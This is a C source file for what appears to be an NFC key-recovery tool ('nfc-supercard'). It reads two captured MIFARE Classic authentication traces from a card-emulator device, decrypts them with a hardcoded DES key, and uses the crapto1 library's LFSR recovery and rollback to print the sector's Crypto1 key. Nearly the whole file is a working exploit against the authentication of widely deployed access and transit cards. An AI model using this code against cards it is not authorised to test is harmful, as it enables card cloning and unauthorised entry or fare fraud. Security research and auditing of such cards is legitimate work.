// gcc -O4 -o nfc-supercard nfc-supercard.c crapto1.c crypto1.c -lnfc -lcrypto

#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#define llx PRIx64
#define lli PRIi64
#include "crapto1.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <openssl/des.h>
#include <nfc/nfc.h>
#include <string.h>

static void
print_hex(const uint8_t *pbtData, const size_t szBytes) {
    size_t  szPos;

    for (szPos = 0; szPos < szBytes; szPos++) {
        printf("%02x  ", pbtData[szPos]);
    }
    printf("\n");
}

int recover(uint32_t uid, uint32_t nt0, uint32_t nr0_enc, uint32_t ar0_enc, uint32_t nt1, uint32_t nr1_enc, uint32_t ar1_enc) {
    struct Crypto1State *s, *t;
    uint64_t key;     // recovered key
    uint32_t ks2;     // keystream used to encrypt reader response

    // Generate lfsr successors of the tag challenge
    printf("\nLFSR successors of the first tag challenge:\n");
    printf("  nt0': %08x\n", prng_successor(nt0, 64));
    printf(" nt0'': %08x\n", prng_successor(nt0, 96));
    printf("\nLFSR successors of the second tag challenge:\n");
    printf("  nt1': %08x\n", prng_successor(nt1, 64));
    printf(" nt1'': %08x\n", prng_successor(nt1, 96));

    // Extract the keystream from the messages
    printf("\nKeystream used to generate {ar_0} and {at_0}:\n");
    ks2 = ar0_enc ^ prng_successor(nt0, 64);
    printf("  ks2: %08x\n", ks2);

    s = lfsr_recovery32(ar0_enc ^ prng_successor(nt0, 64), 0);

    for (t = s; t->odd | t->even; ++t) {
        lfsr_rollback_word(t, 0, 0);
        lfsr_rollback_word(t, nr0_enc, 1);
        lfsr_rollback_word(t, uid ^ nt0, 0);
        crypto1_get_lfsr(t, &key);
        crypto1_word(t, uid ^ nt1, 0);
        crypto1_word(t, nr1_enc, 1);
        if (ar1_enc == (crypto1_word(t, 0, 0) ^ prng_successor(nt1, 64))) {
            printf("\nFound Key: [%012"llx"]\n\n", key);
            break;
        }
    }
    free(s);

    return 0;
}

int
main(int argc, const char *argv[]) {
    nfc_device *pnd;
    nfc_target nt;

    // Allocate only a pointer to nfc_context
    nfc_context *context;

    DES_cblock key = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};
    DES_cblock block;
    DES_key_schedule ks;
    DES_set_odd_parity(&key);
    DES_set_key(&key, &ks);

    // Initialize libnfc and set the nfc_context
    nfc_init(&context);
    if (context == NULL) {
        printf("Unable to init libnfc (malloc)\n");
        exit(EXIT_FAILURE);
    }

    // Display libnfc version
    const char *acLibnfcVersion = nfc_version();
    (void)argc;
    printf("%s uses libnfc %s\n", argv[0], acLibnfcVersion);

    // Open, using the first available NFC device which can be in order of selection:
    //   - default device specified using environment variable or
    //   - first specified device in libnfc.conf (/etc/nfc) or
    //   - first specified device in device-configuration directory (/etc/nfc/devices.d) or
    //   - first auto-detected (if feature is not disabled in libnfc.conf) device
    pnd = nfc_open(context, NULL);

    if (pnd == NULL) {
        printf("ERROR: %s\n", "Unable to open NFC device.");
        exit(EXIT_FAILURE);
    }
    // Set opened NFC device to initiator mode
    if (nfc_initiator_init(pnd) < 0) {
        nfc_perror(pnd, "nfc_initiator_init");
        exit(EXIT_FAILURE);
    }

    printf("NFC reader: %s opened\n", nfc_device_get_name(pnd));

    // Poll for a ISO14443A (MIFARE) tag
    const nfc_modulation nmMifare = {
        .nmt = NMT_ISO14443A,
        .nbr = NBR_106,
    };
    if (nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt) > 0) {
        printf("The following (NFC) ISO14443A tag was found:\n");
        printf("       UID (NFCID%c): ", (nt.nti.nai.abtUid[0] == 0x08 ? '3' : '1'));
        print_hex(nt.nti.nai.abtUid, nt.nti.nai.szUidLen);
    }
    // Use raw send/receive methods
    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false) < 0)
        goto end;
    int res;
    uint8_t abtRx[20];
    uint8_t abtRats[] = { 0xe0, 0x50 };
    //printf("Forcing RATS\n");
    if ((res = nfc_initiator_transceive_bytes(pnd, abtRats, sizeof(abtRats), abtRx, sizeof(abtRx), 0)) < 0)
        goto end;
    //printf("Recovering first auth trace\n");
    uint8_t abtTx[] = {0x0A, 0x00, 0x00, 0xA6, 0xB0, 0x00, 0x10};
    if ((res = nfc_initiator_transceive_bytes(pnd, abtTx, sizeof(abtTx), abtRx, sizeof(abtRx), 0)) < 20)
        goto end;
    //print_hex(abtRx + 2, 16);

    memcpy(&block, abtRx + 2, 8);
    DES_ecb_encrypt(&block, &block, &ks, 0);
    if (memcmp(&block, "\x01\x01\x01\x01\x01\x01\x01\x01", 8) == 0) {
        printf("No trace recorded!\n");
        goto reinit;
    }
    //print_hex(block, 8);
    uint32_t uid0 = (*(((uint8_t *)&block)) << 24) + (*(((uint8_t *)&block) + 1) << 16) + (*(((uint8_t *)&block) + 2) << 8) + *(((uint8_t *)&block) + 3);
    uint8_t cmd0[2];
    memcpy(cmd0, ((uint8_t *)&block) + 4, 2);
    uint16_t iNT0 = (*(((uint8_t *)&block) + 6) << 8) + *(((uint8_t *)&block) + 7);
    uint32_t nt0 = prng_successor(iNT0, 31);

    memcpy(&block, abtRx + 10, 8);
    DES_ecb_encrypt(&block, &block, &ks, 0);
    //print_hex(block, 8);
    uint32_t nr0 = (*(((uint8_t *)&block)) << 24) + (*(((uint8_t *)&block) + 1) << 16) + (*(((uint8_t *)&block) + 2) << 8) + *(((uint8_t *)&block) + 3);
    uint32_t ar0 = (*(((uint8_t *)&block) + 4) << 24) + (*(((uint8_t *)&block) + 5) << 16) + (*(((uint8_t *)&block) + 6) << 8) + *(((uint8_t *)&block) + 7);

    printf("\nFirst trace:\n");
    printf("UID %08X\n", uid0);
    printf("CMD %02X%02X\n", cmd0[0], cmd0[1]);
    //printf("iNT %04X\n", iNT0);
    printf("NT  %04X\n", nt0);
    printf("NR  %08X\n", nr0);
    printf("AR  %08X\n", ar0);

    //printf("Recovering second auth trace\n");
    abtTx[0] = 0x0B;
    abtTx[5] = 0x01;
    if ((res = nfc_initiator_transceive_bytes(pnd, abtTx, sizeof(abtTx), abtRx, sizeof(abtRx), 0)) < 20)
        goto end;
    //print_hex(abtRx + 2, 16);

    memcpy(&block, abtRx + 2, 8);
    DES_ecb_encrypt(&block, &block, &ks, 0);
    if (memcmp(&block, "\x01\x01\x01\x01\x01\x01\x01\x01", 8) == 0) {
        printf("Only one trace recorded!\n");
        goto reinit;
    }
    //print_hex(block, 8);
    uint32_t uid1 = (*(((uint8_t *)&block)) << 24) + (*(((uint8_t *)&block) + 1) << 16) + (*(((uint8_t *)&block) + 2) << 8) + *(((uint8_t *)&block) + 3);
    uint8_t cmd1[2];
    memcpy(cmd1, ((uint8_t *)&block) + 4, 2);
    uint16_t iNT1 = (*(((uint8_t *)&block) + 6) << 8) + *(((uint8_t *)&block) + 7);
    uint32_t nt1 = prng_successor(iNT1, 31);

    memcpy(&block, abtRx + 10, 8);
    DES_ecb_encrypt(&block, &block, &ks, 0);
    //print_hex(block, 8);
    uint32_t nr1 = (*(((uint8_t *)&block)) << 24) + (*(((uint8_t *)&block) + 1) << 16) + (*(((uint8_t *)&block) + 2) << 8) + *(((uint8_t *)&block) + 3);
    uint32_t ar1 = (*(((uint8_t *)&block) + 4) << 24) + (*(((uint8_t *)&block) + 5) << 16) + (*(((uint8_t *)&block) + 6) << 8) + *(((uint8_t *)&block) + 7);

    printf("\nSecond trace:\n");
    printf("UID %08X\n", uid1);
    printf("CMD %02X%02X\n", cmd1[0], cmd1[1]);
    //printf("iNT %04X\n", iNT1);
    printf("NT  %04X\n", nt1);
    printf("NR  %08X\n", nr1);
    printf("AR  %08X\n", ar1);

    recover(uid0, nt0, nr0, ar0, nt1, nr1, ar1);

reinit:
    printf("Reinitializing card\n");
    abtTx[0] = 0x0A;
    abtTx[4] = 0xC0;
    abtTx[5] = 0x00;
    if ((res = nfc_initiator_transceive_bytes(pnd, abtTx, sizeof(abtTx), abtRx, sizeof(abtRx), 0)) < 0)
        goto end;

end:
    // Close NFC device
    nfc_close(pnd);
    // Release the context
    nfc_exit(context);
    exit(EXIT_SUCCESS);
}


